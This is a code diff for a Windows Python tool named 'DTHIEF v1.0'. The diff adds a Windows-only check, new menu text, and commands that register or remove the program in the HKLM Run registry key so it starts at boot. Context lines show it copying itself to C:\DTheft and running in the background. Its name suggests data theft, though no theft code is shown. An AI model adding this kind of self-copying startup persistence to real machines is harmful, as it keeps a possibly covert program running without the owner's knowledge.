@@ -1,8 +1,16 @@
 import os, sys
 from time import sleep
 import shutil, socket
+from sys import platform
 
 setup_path=r"C:\DTheft\setup_Dthief.pyw"
+
+if not platform == "win32" :
+    while True :
+        print(" Sorry This version is only for Windows OS\nA Linux verson will be available soon ")
+        sleep(1.5)
+else :
+    pass
 
 if not os.path.exists("C:\DTheft") :
     os.mkdir("C:\DTheft")
@@ -10,7 +18,6 @@ if os.path.exists("C:\DTheft\setup_Dthief.pyw") :
     pass 
 elif not os.path.exists("C:\DTheft\setup_Dthief.pyw") :
     shutil.copy2(__file__, setup_path)
-    # os.system("copy setup_Dthief.pyw C:\DTheft\setup_Dthief.pyw /Y /Z>nul")
 
 if os.path.exists("C:\Windows\System32\dthief.bat") :
     pass 
@@ -24,23 +31,25 @@ runpath = r"C:\DTheft\run_dthief.vbs"
 
 def intro():
     os.system("color 9")
-    os.system("mode con: COLS=90 LINES=22")
+    os.system("mode con: COLS=90 LINES=28")
     os.system("cls")
     animation = "#"
     print("\t"*5, animation *40, "\n","\t"*4, animation *40," "*5, "| \n", "\t"*3, animation * 10+ "     DTHIEF v1.0", "\t", animation *10, " "*11, "|\n", "\t"*2, animation *40," "*21, "| \n", "\t"*1, animation *40," "*9," |__By saad anouar__|", "\n")
-    print("""\n List commands: \n\n            [--help or --info] to Read about program
+    print("""\n\n\n List commands: \n\n            [--help or --info] to Read about program
             [--run or --start] to execute the program
             [--stop or --kill] to finish the program
             [--exit or --quit] exit and close windows
             [--link or --down] visite original source
-
+            [--bootup or --startup] add Dthief v1.0 program on startup windows
+            [--unboot or --breakup] remove Dthief v1.0 from startup windows
+\n
     ____________________________________________________________________________
     |                                                                           |
     | >> In anytime : YOU CAN CLICK Ctrl+C on your keyboard to quite program    |
     | >> No need to write full command to open program only the first time,     |
     |                          after that just open CMD and type : "dthief"     |
     +___________________________________________________________________________+
-            """)
+           \n """)
 intro()
 
 def help_page():
@@ -56,6 +65,8 @@ def help_page():
 ===========================================================================================
 =    NOTICE :                                                                             =
 =             {Please Read carefully}                                                     =
+=                                                                                         =
+=    the Dthief v1.0 program work only for [windows os]                                   =
 =                                                                                         =
 =    Need to use following command "python setup_dthief.pyw" to open program in first     =
 =    time only, After you can just open command prompt and type "dthief".                 =
@@ -79,10 +90,13 @@ def help_page():
 =    developer on this code part before building or share your software or code.          = 
 =                                                                                         =
 =    List of Commands :                                                                   =
-=                      Enter            : Dthief Home page                                =
-=                      --run or --start : Lanch the program                               =
-=                      --kill or --stop : stop program from running                       =
-=                      --info or --help : you direct to this help page                    =
+=                      Enter                 : Home page                                  =
+=                      --run or --start      : Lanch the program                          =
+=                      --kill or --stop      : stop program from running                  =
+=                      --info or --help      : you direct to this help page               =
+=                      --link or --down      : visite original source                     =
+=                      --bootup or --startup : add Dthief to startup windows              =
+=                      --unboot or --breakup : remove Dthief from startup Windows         =
 = +_____________________________________________________________________________________+ =
 = |                                                                                     | =
 = | [KEEP IN MIND] after lanching the program, he still running on background even you  | =
@@ -300,13 +314,20 @@ while True :
             else:
                 os.system("mode con: COLS=50 LINES=10")
                 os.system("cls && color 9")
-                print("\n"*4," "*4, "CHECK YOUR CONNECTION AND TRY AGAIN :(")
+                print("\n"*4," "*4, ":( CHECK YOUR CONNECTION AND TRY AGAIN ")
                 sleep(2.0)
                 pass
+        elif choose == "--bootup" or choose == "--BOOTUP" or choose == "--startup" or choose == "--STARTUP" :
+            os.system('REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v dthief /t REG_SZ /d "C:\DTheft\dthief_run.vbs"')
+            os.system('msg * "Dthief v1.0 add to startup windows successfuly"')
+
+        elif choose == "--unboot" or choose == "--UNBOOT" or choose == "--breakup" or choose == "--BREAKUP" :
+            os.system("REG delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v dthief /f")
+            os.system('msg * "Dthief v1.0 remove from startup windows successfuly"')
+
+
+
                 
-
-
-
     user_answer()
 
         
